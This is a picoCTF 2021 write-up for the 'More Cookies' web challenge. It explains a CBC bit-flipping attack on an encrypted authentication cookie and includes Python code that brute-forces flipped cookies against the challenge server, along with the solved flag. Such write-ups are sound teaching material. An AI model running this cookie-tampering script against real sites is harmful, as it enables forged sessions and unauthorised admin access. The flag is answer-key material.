# More Cookies

## Information

- picoCTF 2021
- Web Exploitation
- 90 Points

## Description

I forgot Cookies can Be modified Client-side, so now I decided to encrypt them! http://mercury.picoctf.net:25992/

## Hints

1. https://en.wikipedia.org/wiki/Homomorphic_encryption

2. The search endpoint is only helpful for telling you if you are admin or not, you won't be able to guess the flag name

## Solution

Looking at the Cookies tab in DevTools we can see that we only have one cookie called "auth_name" with the value being encrypted with Base64.

From the description of the challenge, the C in Cookies, B in Be and C in Client are all capatilised which may hint at the fact that CBC, therefore maybe we can perform a CBC bitflip to get the cookie value which allows us to get the flag. Read more about the CBC bit flipping attack [here](https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode/66086#66086).

This challenge requires us to create a Python script which brute forces all possible cookie values until we get the correct value.
The script is adapted from this [script](https://github.com/kelalaka153/CBC-Bit-Flipping-Attack).

We start by first retrieving the cookie value from the website. You can just copy the cookie value into the script as a string, e.g. `raw_cookie = "ZWVoY0xtNzEyc25iTi80d1RyUGZZRk1SM043NXU1TmtCN3dTbVpQbldBNWpaVml1MTgra3RWNW1NYUMzY3JGY0tWZEdwbDJVQ0xxSDQ2OUl2WlM3SWduZ0RUa3RJVXF1RWRtcjJKSEdvdCs4N21LUXp0ak55bVBjbWUyQ09JcGo=`. Alternatively you can define a function `get_raw_cookie_value` which takes in the URL of the website to retrieve the cookie value of "auth_name" using the `requests` library.

```python
def get_raw_cookie_value(URL: str) -> str:
    session = requests.Session()
    session.get(URL)
    raw_cookie = session.cookies["auth_name"]
    return raw_cookie
```

The `cbc_bitflip` function which would flip a certain bit, takes in three parameters: `pos` which is the byte position, `bit` which is the bit we want to flip and `data` which is the cookie value. The cookie value is first decoded and converted into a `bytearray`. We then do an XOR operation which would flip the bit. The modified byte is then re-added to the `bytearray` and converted back to `bytes` and encoded again using Base64.

```python
def cbc_bitflip(pos: int, bit: int, data: str) -> str:
    raw = b64decode(data)
    list1 = bytearray(raw)
    list1[pos] = list1[pos] ^ bit
    raw = bytes(list1)
    raw = b64encode(raw)
    return raw.decode("utf-8")
```

Now we need to go through each bit of the cookie value and flip it. This can be done using two `for` loops. The outer loop would go through each byte and the inner loop would go through each of the bits in that byte. The function creates a new cookie with the modified value and sees if the response contains "picoCTF". If it does then that cookie value is the correct value and we get our flag.

```python
raw_cookie = get_raw_cookie_value(URL)
for i in range(len(raw_cookie)):
    for j in [1, 2, 4, 8, 16, 32, 64, 128]:
        modified_cookie = cbc_bitflip(i, j, raw_cookie)
        cookie = {'auth_name': modified_cookie}
        response = requests.get(URL, cookies=cookie)
        if "picoCTF" in response.text:
            print("Cookie:", modified_cookie)
            print("\nResponse\n==================\n", response.text)
            break
```

The whole script can be found [here](/web-exploitation/more-cookies/cbc_bitflip_attack.py).

## Flag

picoCTF{cO0ki3s_yum_82f39377}
